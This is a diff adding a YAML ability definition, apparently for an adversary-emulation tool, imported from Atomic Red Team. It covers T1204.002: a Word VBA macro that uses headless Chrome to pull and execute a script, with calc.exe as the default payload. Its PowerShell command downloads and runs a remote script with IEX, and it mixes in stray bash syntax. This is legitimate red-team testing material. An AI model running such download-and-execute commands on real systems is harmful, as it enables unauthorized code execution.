@@ -1,0 +1,62 @@
+- id: a19ee671-ed98-4e9d-b19c-d1954a51585a
+  name: Headless Chrome code execution via VBA
+  description: 'This module uses Google Chrome combined with ScriptControl to achieve
+    code execution. It spawns a local
+
+    webserver hosting our malicious payload. Headless Google Chrome will then reach
+    out to this webserver
+
+    and pull down the script and execute it. By default the payload will execute calc.exe
+    on the system.'
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: 'try {; $wdApp = New-Object -COMObject "Word.Application"; Stop-Process
+          -Name "winword"; exit 0 } catch { exit 1 }; then : ; else Write-Host "You
+          will need to install Microsoft Word manually to meet this requirement";
+          fi; try {; $chromeInstalled = (Get-Item (Get-ItemProperty ''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App
+          Paths\chrome.exe'').''(Default)'').VersionInfo.FileName; exit 0; } catch
+          { exit 1 }; then : ; else Write-Host "You will need to install Google Chrome
+          manually to meet this requirement"; fi; [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"
+          -officeProduct "Word" -sub "ExecChrome"'
+        cleanup: Stop-Process -name mshta
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - execution
+  - t1204.002
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Microsoft Word must be installed
+
+        '
+      prereq_command: "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\
+        \n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
+        to meet this requirement"
+
+        '
+    - description: 'Google Chrome must be installed
+
+        '
+      prereq_command: "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\\
+        SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n\
+        \  exit 0\n} catch { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Google Chrome manually
+        to meet this requirement"
+
+        '
+    technique_created: '2020-03-11T14:49:36.954Z'
+    atomic_guid: a19ee671-ed98-4e9d-b19c-d1954a51585a
+    import_timestamp: '2025-06-24T11:15:03.124638Z'
